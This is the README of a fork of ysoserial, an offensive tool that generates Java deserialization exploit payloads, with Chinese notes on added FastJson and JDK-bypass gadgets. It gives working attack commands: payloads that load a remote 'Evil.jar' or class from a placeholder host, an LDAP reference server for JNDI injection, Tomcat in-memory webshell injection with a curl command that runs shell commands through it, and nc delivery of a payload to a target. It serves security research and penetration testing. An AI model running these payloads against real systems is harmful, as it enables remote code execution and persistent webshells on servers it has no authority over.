
# ysoserial

[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

# ysoserial exp extend ;)

---

*2022-11-29 14:52:14 +0800 CST*:

## about

- add `ysoserial/payloads/FastJson.java` For fastjson 反序列化

- add `ysoserial/payloads/JRMPClient_bypass_jep_jdk241.java` For >= jdk241 bypass.

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.48</version>
</dependency>
```

## ERROR

```console
[ERROR] /Users/bin4xin/.../FastJson.java:[3,27] 错误: 程序包com.alibaba.fastjson不存在
```

- 添加jar到本地仓库

```bash
mvn install:install-file -Dfile=/Users/bin4xin/path/to/fastjson-1.2.48.jar -DgroupId=com.alibaba -DartifactId=fastjson -Dversion=1.2.48 -Dpackaging=jar
mvn clean package -DskipTests
```

## REF
[java二次反序列化初探 @bmth666 (Orz) ](http://www.bmth666.cn/bmth_blog/2022/09/20/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/#2022%E7%BD%91%E9%BC%8E%E6%9D%AF-%E7%8E%84%E6%AD%A6%E7%BB%84-ezjava){:target="_blank"}

## READ MORE about above usage.

[2022年网鼎杯玄武组赛题复盘-[Web-ezJava]](https://sentrylab.cn/about/WANGDINGCTF2022-WEB-ezJava-Walkthrough/){:target="_blank"}

---

*2021年 3月31日 星期三 10时22分20秒 CST* 在原仓库中：

```
origin  https://github.com/threedr3am/ysoserial.git (fetch)
origin  https://github.com/threedr3am/ysoserial.git (push)
```

克隆下来的项目无法构建成功；经过排错现push仓库上线。[_进一步了解排错步骤_](https://bin4xin.sentrylab.cn/about/ALL-mvn-build-errors/){:target="_blank"}

* _感谢threedr3am_师傅开源的代码；
* 吾辈当砥砺前行。

---

# ysoserial

[![Join the chat at https://gitter.im/frohoff/ysoserial](
https://badges.gitter.im/frohoff/ysoserial.svg)](
https://gitter.im/frohoff/ysoserial?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
[![Download Latest Snapshot](https://img.shields.io/badge/download-master-green.svg)](
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)
[![Travis Build Status](https://api.travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![logo](ysoserial.png)

## 快速批量生成ser序列化payload数据
例：
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CMD '/bin/bash' '-c' '/System/Applications/Calculator.app/Contents/MacOS/Calculator'
```
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JAR 'http://xxx.xxx.xxx:8080/Evil.jar'
```
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CODEBASE 'http://xxx.xxx.xxx:8080:Evil.class'
```
生成的ser文件会在当前目录的out_ser目录下，若是JNDI注入攻击，建议配合我fork并魔改过的marshalsec进行FUZZ，参考：https://github.com/threedr3am/marshalsec
```
java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1#Evil.class /tmp/out_ser
```
当使用序列化gadget攻击jdk8u191+的服务时，上面的http://127.0.0.1#Evil.class随意填写，起作用得是目录/tmp/out_ser下的payload，会遍历进行发送，若是jdk8u191-，那就使用codebase直接打

## tomcat通杀回显-内存webshell
例：
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
CommonsCollections11ForTomcatEchoInject > echo.payload
```
然后使用上述得到的恶意序列化数据 echo.payload 攻击一遍，然后再继续下面的操作
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
CommonsCollections11ForTomcatShellInject > shell.payload
```
使用恶意序列化数据 shell.payload 再攻击一遍，就能得到一个内存级的webshell，任意路径，参数threedram为命令
```
curl http://127.0.0.1:8080/aaa\?threedr3am\=ls%20/


## Description

Originally released as part of AppSecCali 2015 Talk
["Marshalling Pickles: how deserializing objects will ruin your day"](
        https://frohoff.github.io/appseccali-marshalling-pickles/)
with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
Later updated to include additional gadget chains for
[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                     Dependencies
     -------             -------                     ------------
     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades           clojure:1.8.0
     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                    commons-collections:3.1
     CommonsCollections2 @frohoff                    commons-collections4:4.0
     CommonsCollections3 @frohoff                    commons-collections:3.1
     CommonsCollections4 @frohoff                    commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                    groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser            js:1.7R2
     MozillaRhino2       @_tint0                     js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                   rome:1.0
     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
```

## Examples

```shell
$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)

Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.

## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also
* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
